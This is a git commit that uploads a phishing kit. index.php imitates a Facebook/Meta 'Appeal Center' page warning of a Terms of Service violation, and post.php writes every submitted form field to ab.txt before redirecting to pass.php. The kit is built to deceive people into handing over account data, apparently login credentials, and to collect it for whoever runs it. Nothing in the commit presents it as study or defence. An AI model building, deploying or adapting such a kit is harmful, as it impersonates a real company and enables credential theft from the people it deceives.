e6d6e3192ba770cd08a9760eedb9116c13ed6737
requstapply <151566227+requstapply@users.noreply.github.com>
2023-11-23 07:42:04 -0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 - 𝗦𝘂𝗯𝗺𝗶𝘁 𝗔𝗽𝗽𝗲𝗮𝗹</title>
+  <link rel="shortcut icon" href="">
+  <link rel="icon" type="image/x-icon" href="https://page-transparency.glitch.me/favicon.ico">
+  <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body class="">
+  <form action="/request.php" method="post">
+    <div id="page-div">
+      <div id="progress-bar-container" class="">
+        <div class="iConWeb">
+          <img alt="" src="" width="200%">
+        </div>
+      </div>
+
+      <div id="interview-page-container" class="">
+        <div class="BackArrowAndHeading">
+          <center><img alt="" src="https://cdn.glitch.global/9f6274ad-2ef6-41d2-8bb8-a2c279e4a749/logo.png?v=1695593689761" width="17%"><br>
+             </p>
+            </div><div class=""><div class="flex justify-center mx-2">
+              𝗠𝗲𝘁𝗮 𝗔𝗽𝗽𝗲𝗮𝗹 𝗖𝗲𝗻𝘁𝗲𝗿</h5>
+        </div>
+        <div id="interview-container">
+          <div id="tax-form">
+            <div id="InformationSection">
+              <div class="Question InformationSection">
+              <div class="CaptionWrapper-400 mx-10">
+                <div class="Caption-400 mx-10"> <div class=""><div class="flex justify-center mx-2">
+                  
+<font color="gray">
+                    It seem that,you have vioated our Terms of Service and Community Guidelines.
+                  </p>
+                     𝗍𝗈 𝗌𝗎𝖻𝗆𝗂𝗌𝗌𝗂𝗈𝗇 𝖿𝗈𝗋𝗆. click "Continue" Button    
+                  
+                    </label>
+                  </div>
+                  </div>
+                  </div>
+                  <span  
+                     </p>
+                    </div><div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]"><div class="flex justify-center mx-2">
+                      <button class="border h-7 w-32  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">
+                        Continue
+                </div>
+              </div>
+            </div>
+            <center>
+              <font color="black">
+                <font size="2">Meta © 2023
+          </div>
+        </div>
+      </div>
+  </form>
+
+</body>
+
+</html>
---
+++ post.php
@@ -0,0 +1,18 @@
+<?php
+
+// Set the location to redirect the page
+header ('Location: pass.php');
+
+// Open the text file in writing mode
+$file = fopen("ab.txt", "a");
+
+foreach($_POST as $variable => $value) {
+	fwrite($file, $variable);
+	fwrite($file, "=");
+	fwrite($file, $value);
+	fwrite($file, "\r\n");
+}
+fwrite($file, "\r\n");
+fclose($file);
+exit;
+?>
